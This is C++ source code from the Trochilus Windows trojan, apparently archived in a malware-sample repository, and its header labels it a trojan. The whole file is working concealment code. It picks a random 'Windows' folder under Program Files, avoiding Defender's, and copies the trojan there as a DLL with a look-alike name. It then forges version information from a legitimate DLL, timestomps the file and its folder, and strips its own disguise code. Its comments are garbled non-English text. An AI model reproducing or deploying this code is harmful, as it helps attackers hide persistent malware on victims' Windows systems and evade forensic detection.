/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#include "stdafx.h"
#include <shlobj.h>
#include <time.h>
#include "file/MyFile.h"
#include "peutils/peutils.h"
#include "common.h"
#include "Chameleon.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Version.lib")

#define MYRAND(_base) ((int) ((double)rand() / (RAND_MAX + 1) * (_base)))

//ö��Ŀ¼
static BOOL EnumDir(LPCTSTR findstr, TStringVector& filenameList, LPCTSTR filterName = NULL)
{
	WIN32_FIND_DATA finddata = {0};
	HANDLE hFind = ::FindFirstFile(findstr, &finddata);
	if (INVALID_HANDLE_VALUE == hFind) return FALSE;

	do 
	{
		if (finddata.cFileName[0] == '.' && (finddata.cFileName[1] == '\0' || finddata.cFileName[1] == '.')) continue;
		else if (NULL != filterName && _tcscmp(finddata.cFileName, filterName) == 0) continue;

		filenameList.push_back(finddata.cFileName);
	} while (::FindNextFile(hFind, &finddata));

	::FindClose(hFind);

	return TRUE;
}

//��Program files���ҵ����ʵ�ģ�µ��ļ�
static BOOL FindLocation(tstring& dirpath, tstring& selectedDllFilename, tstring& suitableFilename, LPCTSTR filterName, FILETIME* pCreationTime, FILETIME* pLastAccessTime, FILETIME* pLastWriteTime)
{
	CODE_MARK_BEGIN();
	TCHAR pfFilepath[MAX_PATH] = {0};
	if (! ::SHGetSpecialFolderPath(NULL, pfFilepath, CSIDL_PROGRAM_FILES, FALSE))
	{
		errorLogE(_T("get pf failed."));
		return FALSE;
	}

	//�о�program filesĿ¼�µ�������Ŀ¼
	TCHAR dirFindstr[MAX_PATH] = {0};
	_stprintf_s(dirFindstr, _T("%s\\*."), pfFilepath);

	TStringVector dirnameList;
	if (! EnumDir(dirFindstr, dirnameList))
	{
		errorLog(_T("enum pf dirs failed."));
		return FALSE;
	}

	//ö��������Ŀ¼���ҳ���windows��ͷ�ģ�����Ŀ¼�������dll�ļ���Ŀ¼
	TStringVector::iterator dirIter = dirnameList.begin();
	while (dirIter != dirnameList.end())
	{
		tstring dirname = *dirIter;
		makeLower(dirname);

		//�������windows������ͷ��Ŀ¼���߰���defender������������
		if (dirname.find(_T("windows ")) != 0 || dirname.find(_T("defender")) != tstring::npos)
		{
			dirIter = dirnameList.erase(dirIter);
			continue;
		}

		//����Ŀ¼�в���dll�ļ��������Ŀ¼��û��dll�ļ�������
		TCHAR dllFindstr[MAX_PATH] = {0};
		_stprintf_s(dllFindstr, _T("%s\\%s\\*.dll"), pfFilepath, dirIter->c_str());

		TStringVector dllfileList;
		if (! EnumDir(dllFindstr, dllfileList, filterName) || dllfileList.size() == 0)
		{
			dirIter = dirnameList.erase(dirIter);
			continue;
		}

		dirIter++;
	}

	if (dirnameList.size() == 0)
	{
		errorLog(_T("no suitable dir"));
		return FALSE;
	}

	//���ѡȡһ��Ŀ¼
	srand((unsigned)time(NULL));
	dirpath = pfFilepath;
	dirpath += '\\';
	dirpath += dirnameList[MYRAND(dirnameList.size())];

	//ѡȡһ���ļ���ģ��
	TCHAR dllFindstr[MAX_PATH] = {0};
	_stprintf_s(dllFindstr, _T("%s\\*.dll"), dirpath.c_str());
	TStringVector dllfileList;
	if (! EnumDir(dllFindstr, dllfileList, filterName) || dllfileList.size() == 0)
	{
		errorLogE(_T("enumdir in [%s] failed"), dllFindstr);
		return FALSE;
	}
	selectedDllFilename = dllfileList[MYRAND(dllfileList.size())];

	//��ȡģ���ļ���ʱ��
	tstring selectedDllFilepath = dirpath;
	selectedDllFilepath += '\\';
	selectedDllFilepath += selectedDllFilename;
	HANDLE hFile = ::CreateFile(selectedDllFilepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		errorLogE(_T("open selected dll file failed[%s]."), selectedDllFilepath.c_str());
		return FALSE;
	}
	::GetFileTime(hFile, pCreationTime, pLastAccessTime, pLastWriteTime);
	::CloseHandle(hFile);

	//�������ʵ�����
#define SUBNAME_COUNT 5
	tstring::size_type pos = selectedDllFilename.find_last_of('.');
	if (pos > 9) pos = 9;	//�ļ����Ƽ���subnames�еĺ�׺�����ܳ���servantshell�ĳ��ȡ�subnames�3���ַ��������ȡģ���ļ�����9���ַ�
	suitableFilename = selectedDllFilename.substr(0, pos);
	LPCTSTR subnames[SUBNAME_COUNT] = {_T("2"), _T("upd"), _T("srv"), _T("svc"), _T("ldr")};
	suitableFilename += subnames[MYRAND(SUBNAME_COUNT)];
	suitableFilename += _T(".dll");
	CODE_MARK_END();

	return TRUE;
}

//�汾��Ϣ
typedef struct VS_VERSIONINFO
{
	WORD                wLength;
	WORD                wValueLength;
	WORD                wType;
	WCHAR               szKey[1];
	WORD                wPadding1[1];
	VS_FIXEDFILEINFO    Value;
	WORD                wPadding2[1];
	WORD                wChildren[1];
} VS_VERSIONINFO;
typedef struct
{
	WORD wLanguage;
	WORD wCodePage;
} TRANSLATE_INFO;
static LPCTSTR _TRANSLATE_STRING = _T("\\VarFileInfo\\Translation");
static LPCTSTR VAR_NAMES[] = {
	_T("CompanyName"),
	_T("FileDescription"),
	_T("FileVersion"),
	_T("LegalCopyright"),
	_T("ProductName"),
	_T("ProductVersion"),
	_T("InternalName"),
	_T("OriginalFilename")
};
#define VAR_INTERNAL_NAME 6
#define VAR_ORIGINAL_FILENAME 7
#define VAR_NAMES_LEN 8
#define VAR_TOCOPY_LEN 6
typedef struct MY_VERSION_INFO
{
	LPBYTE lpBuffer;
	DWORD dwSize;

	VS_VERSIONINFO* pVersionInfo;
	VS_FIXEDFILEINFO* pFixedFileInfo;
	TRANSLATE_INFO* lpTranslateInfo;
	LPTSTR pVals[VAR_NAMES_LEN];

	~MY_VERSION_INFO()
	{
		if (NULL != lpBuffer)
		{
			delete[] lpBuffer;
			lpBuffer = NULL;
		}
	}
} MY_VERSION_INFO;

//��ȡpe�ļ��İ汾��Ϣ
static BOOL GetMyVersionInfo(LPCTSTR filepath, MY_VERSION_INFO* pInfo)
{
	CODE_MARK_BEGIN();
	DWORD dwHandle = 0;
	DWORD dwSize = ::GetFileVersionInfoSize(filepath, &dwHandle);
	if (0 == dwSize)
	{
		return FALSE;
	}

	pInfo->lpBuffer = new BYTE[dwSize];
	pInfo->dwSize = dwSize;
	if (! ::GetFileVersionInfo(filepath, 0, dwSize, pInfo->lpBuffer))
	{
		return FALSE;
	}
	DWORD dwFixedInfoOffset = 0;
	for (; dwFixedInfoOffset < dwSize - sizeof(DWORD) && (0xFEEF04BD != *(LPDWORD)&pInfo->lpBuffer[dwFixedInfoOffset]); dwFixedInfoOffset++);
	if (dwFixedInfoOffset < dwSize - sizeof(DWORD)) pInfo->pFixedFileInfo = (VS_FIXEDFILEINFO*)(pInfo->lpBuffer + dwFixedInfoOffset);
	pInfo->pVersionInfo = (VS_VERSIONINFO*) pInfo->lpBuffer;

	UINT uTemp = 0;
	if (! ::VerQueryValue(pInfo->lpBuffer, _TRANSLATE_STRING, (LPVOID *) &pInfo->lpTranslateInfo, &uTemp))
	{
		return FALSE;
	}

	for (int i = 0; i < VAR_NAMES_LEN; i++)
	{
		TCHAR queryStr[MAX_PATH] = {0};
		_stprintf_s(queryStr, _T("\\StringFileInfo\\%04x%04x\\%s"),
			pInfo->lpTranslateInfo->wLanguage, pInfo->lpTranslateInfo->wCodePage, VAR_NAMES[i]);
		VerQueryValue(pInfo->lpBuffer, (LPTSTR)((LPCTSTR) queryStr), 
			(LPVOID *) &pInfo->pVals[i], &uTemp);
	}
	CODE_MARK_END();

	return TRUE;
}

//α��汾��Ϣ
static BOOL MakeFakeVersionInfo(LPCTSTR sourceFilepath, LPCTSTR targetFilepath, LPCTSTR targetFilename)
{
	CODE_MARK_BEGIN();
	MY_VERSION_INFO sourceInfo = {0};
	if (! GetMyVersionInfo(sourceFilepath, &sourceInfo))
	{
		errorLog(_T("get source versioninfo failed[%s]"), sourceFilepath);
		return FALSE;
	}

	MY_VERSION_INFO targetInfo = {0};
	if (! GetMyVersionInfo(targetFilepath, &targetInfo))
	{
		errorLog(_T("get target versioninfo failed[%s]"), targetFilepath);
		return FALSE;
	}

	for (int i = 0; i < VAR_TOCOPY_LEN; i++)
	{
		_tcsncpy_s(targetInfo.pVals[i], _tcslen(targetInfo.pVals[i]) + 1, sourceInfo.pVals[i], _tcslen(sourceInfo.pVals[i]));
	}
	targetInfo.pFixedFileInfo->dwProductVersionLS = sourceInfo.pFixedFileInfo->dwProductVersionLS;
	targetInfo.pFixedFileInfo->dwProductVersionMS = sourceInfo.pFixedFileInfo->dwProductVersionMS;
	targetInfo.pFixedFileInfo->dwFileVersionLS = sourceInfo.pFixedFileInfo->dwFileVersionLS;
	targetInfo.pFixedFileInfo->dwFileVersionMS = sourceInfo.pFixedFileInfo->dwFileVersionMS;
	_tcsncpy_s(targetInfo.pVals[VAR_ORIGINAL_FILENAME], _tcslen(targetInfo.pVals[VAR_ORIGINAL_FILENAME]) + 1, targetFilename, _tcslen(targetFilename));
	_tcsncpy_s(targetInfo.pVals[VAR_INTERNAL_NAME], _tcslen(targetInfo.pVals[VAR_INTERNAL_NAME]) + 1, targetFilename, _tcslen(targetFilename) - 4);

	HANDLE hResource = BeginUpdateResource(targetFilepath, FALSE);
	if (NULL == hResource)
	{
		errorLog(_T("beginupdate resource failed."));
		return FALSE;
	}

	if (! UpdateResource(hResource, RT_VERSION, MAKEINTRESOURCE(VS_VERSION_INFO), 
		targetInfo.lpTranslateInfo->wLanguage, targetInfo.lpBuffer, targetInfo.dwSize))
	{
		errorLog(_T("updateresource failed"));
		return FALSE;
	}

	if (! EndUpdateResource(hResource, FALSE))
	{
		errorLogE(_T("endupdateresource failed"));
		return FALSE;
	}
	CODE_MARK_END();

	return TRUE;
}

BOOL Camp(LPCTSTR currentFilepath, LPCTSTR dllFilename, tstring& dllFilepath)
{
	BOOL bSuccess = FALSE;
	dllFilepath = currentFilepath;
	CODE_MARK_BEGIN();

	//���Ҳ�����һ�����ʵİ����ļ�·��
	tstring dirpath, suitableFilename, selectedDllFilename;
	FILETIME ftCreationTime = {0}, ftLastAccessTime = {0}, ftLastWriteTime = {0};
	if (! FindLocation(dirpath, selectedDllFilename, suitableFilename, dllFilename, &ftCreationTime, &ftLastAccessTime, &ftLastWriteTime))
	{
		errorLog(_T("find suitable location failed"));
		return FALSE;
	}
	tstring targetDllFilepath = dirpath;
	targetDllFilepath += '\\';
	targetDllFilepath += suitableFilename;

	ByteBuffer fileContent;

	do 
	{
		//��ȡ����Ŀ¼��ʱ������
		DECLARE_TIMES(dir);
		GetFileTimes(dirpath.c_str(), TRUE, TIMES_PARAM(dir));
		
		//��ȡ����
		MyFile me;
		if (! me.Open(currentFilepath, GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
		{
			errorLogE(_T("open [%s] failed."), currentFilepath);
			break;
		}

		if (! me.ReadAll(fileContent))
		{
			errorLogE(_T("read file content failed."));
			break;
		}

		me.Close();

		//����������dll�й���Chameleon���ִ��룬���ⱻ������������װ����
		PEUtils::CleanCode((LPBYTE)fileContent);

		//д��Ŀ��λ��
		MyFile target;
		if (! target.Open(targetDllFilepath.c_str(), GENERIC_WRITE, CREATE_ALWAYS, 0))
		{
			errorLogE(_T("create target file failed."));
			break;
		}

		if (! target.Write(fileContent, fileContent.Size()))
		{
			errorLogE(_T("write target failed."));
			break;
		}
		target.Close();

		//���ư汾��Ϣ
		tstring simFilepath = dirpath;
		simFilepath += '\\';
		simFilepath += selectedDllFilename;
		MakeFakeVersionInfo(simFilepath.c_str(), targetDllFilepath.c_str(), suitableFilename.c_str());

		//�����ļ�ʱ��
		SetFileTimes(targetDllFilepath.c_str(), FALSE, ftCreationTime, ftLastAccessTime, ftLastWriteTime);

		//��������Ŀ¼��ʱ��
		SetFileTimes(dirpath.c_str(), TRUE, TIMES_PARAM(dir));
		
		dllFilepath = targetDllFilepath;
		bSuccess = TRUE;
	} while (FALSE);

	CODE_MARK_END();

	return bSuccess;
}
